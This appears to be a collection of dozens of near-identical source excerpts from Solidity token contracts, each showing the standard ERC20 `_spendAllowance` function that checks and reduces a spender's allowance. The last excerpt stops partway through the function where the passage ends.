<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="123" endline="133" pcid="3316">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="125" endline="135" pcid="2710">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="122" endline="132" pcid="3295">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="122" endline="132" pcid="2381">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="119" endline="129" pcid="3280">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="124" endline="134" pcid="3260">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="118" endline="128" pcid="2727">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="216" endline="226" pcid="2396">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="124" endline="134" pcid="3245">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="122" endline="132" pcid="3230">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="125" endline="135" pcid="2742">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="125" endline="135" pcid="5567">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="124" endline="134" pcid="3215">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="126" endline="136" pcid="2411">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="125" endline="135" pcid="1921">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="123" endline="133" pcid="1190">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="123" endline="133" pcid="73">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="123" endline="133" pcid="3200">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="122" endline="132" pcid="2757">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="124" endline="134" pcid="3185">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="213" endline="223" pcid="3170">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="126" endline="136" pcid="2426">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="127" endline="137" pcid="2581">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="122" endline="132" pcid="3155">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="122" endline="132" pcid="3140">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="122" endline="132" pcid="2772">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="125" endline="135" pcid="2441">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="125" endline="135" pcid="826">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="127" endline="137" pcid="3125">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="127" endline="140" pcid="6490">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="121" endline="131" pcid="8190">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="125" endline="135" pcid="3110">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="125" endline="135" pcid="3095">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="123" endline="133" pcid="2792">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="224" endline="234" pcid="4514">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="123" endline="133" pcid="2456">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="124" endline="134" pcid="3080">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="123" endline="133" pcid="3065">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="741" endline="751" pcid="4099">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="122" endline="132" pcid="5932">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="125" endline="135" pcid="3876">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="123" endline="133" pcid="2808">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="121" endline="131" pcid="5771">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="121" endline="131" pcid="5756">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="126" endline="136" pcid="2471">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="449" endline="459" pcid="3034">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="122" endline="132" pcid="5024">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="121" endline="131" pcid="2829">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="123" endline="133" pcid="7464">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="125" endline="135" pcid="7673">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="123" endline="133" pcid="2547">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="125" endline="135" pcid="2844">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="123" endline="133" pcid="3013">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="121" endline="131" pcid="2998">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="125" endline="135" pcid="2983">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="124" endline="134" pcid="2859">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="124" endline="134" pcid="5651">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="124" endline="134" pcid="5259">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="124" endline="134" pcid="9050">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="118" endline="128" pcid="6191">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="124" endline="134" pcid="2968">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="223" endline="233" pcid="3827">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="123" endline="133" pcid="2874">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="129" endline="139" pcid="2532">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="123" endline="133" pcid="2949">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="122" endline="132" pcid="2934">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="122" endline="132" pcid="2889">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="120" endline="130" pcid="2517">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="125" endline="135" pcid="2919">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="125" endline="135" pcid="2904">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="123" endline="133" pcid="8431">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="125" endline="135" pcid="9151">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="126" endline="136" pcid="6800">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
